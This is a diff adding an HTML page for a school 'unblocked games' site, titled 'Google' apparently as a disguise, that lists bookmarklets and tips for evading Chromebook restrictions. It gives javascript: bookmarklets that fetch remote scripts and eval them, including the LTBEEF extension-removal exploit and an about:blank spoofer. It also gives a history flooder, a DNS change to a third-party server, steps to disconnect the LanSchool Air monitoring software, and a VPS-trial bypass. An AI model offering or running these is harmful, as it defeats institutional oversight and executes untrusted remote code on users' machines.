@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google</title>
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/main.css">
+  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.2.0/css/all.css">
+</head>
+<body>
+  <nav>
+    <img src="images/logo.png" alt="logo">
+    <h1>DBP's Games</h1>
+    <ul>
+        <a class="test" href="index.html">Home</a>
+        <a href="main.html">Proxies</a>
+        <a href="bookmarklet.html">Tips and Bookmarklets</a>
+        <a href="Othersites.html">Other Sites</a>
+    </ul>
+</nav>
+  <div class="featured">
+    <h2>These bookmarklets and tips are from across the web, and from me! :)</h2>
+    <div class="column">
+      <h2>LTBEEF (Patched in later versions of Chrome/Chromium based browsers) <a href="https://github.com/3kh0/ext-remover">(Github)</a></h2>
+      <p class="white">javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);</p>
+      <h2>About:Blank Spoofer <a href="https://github.com/yeeterlol/AboutBlankSpoofer">(Github)</a></h2>
+      <p class="white">javascript:fetch(`https://res.cloudinary.com/flushed/raw/upload/v${Math.floor(Math.random() * 9999999)}/spoofer_bpldln.js`).then((res) => res.text().then((t) => eval(t)))</p>
+      <h2>History Flooder/Remover <a href="https://www.youtube.com/watch?v=j_saECXCoV0">(I cant find credit so here are cute dogs)</a></h2>
+      <p class="white">javascript:var num=prompt("History flood amount:");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}</p>
+      <h2>IStealYourDNS <a href="https://github.com/rusprice/awesome-school-exploits#istealyourdns">(Github)</a></h2>
+      <p class="white">Open your chromebooks DNS settings, then change your primary DNS to 72.5.33.65, and change your secondary DNS to 1.1.1.1</p>
+      <h2>Disable LanSchool Air <a href="https://github.com/rusprice/awesome-school-exploits#disable-lanschool-air">(Github)</a></h2>
+      <p class="white">Forcibly close LanSchool by right clicking the app on the bottom appbar and pressing close, it will reopen however it won't be connected and will say "Not connected" in the bottom left corner</p>
+      <h2>Unblock anything and run anything <a href="https://www.apponfly.com/">(AppOnFly)</a></h2>
+      <p class="white">Use the AppOnFly VPS free trial. The free trial requires 0 account and 0 credit cards. You just press start free trial, and press start. It should take like 30 seconds to load and then bam</p>
+      <h2>Don't cheat.</h2>
+      <p class="white">Seriously, cheating on tests gets you nothing in return. Sure, maybe it'll give you one good grade, but they'll figure out and that grade will go away. Who cares about grades if it's at your expense?</p>
+      <h2>YouTube Unblocked <a href="https://piped.video/">(Website)</a></h2>
+      <p class="white">Use <a href="https://piped.video/">piped.video</a> to watch youtube.</p>
+      <h2>Only use Unblocked Games websites when you have free time.</h2>
+      <p class="white">Seriously, this is one of the best tips I can give.</p>
+      <h2>Use quizlet to study <a href="https://quizlet.com/">(Website)</a></h2>
+      <p class="white">Quizlet is one of the easiest websites for studying, seriously. It's easy enough that you can get 100% if you use it, it's an online study helper.</p>
+    </div>
+      </a>
+    </div>
+  </div>
+</body>
+</html>
+
+<script src="script.js"></script>
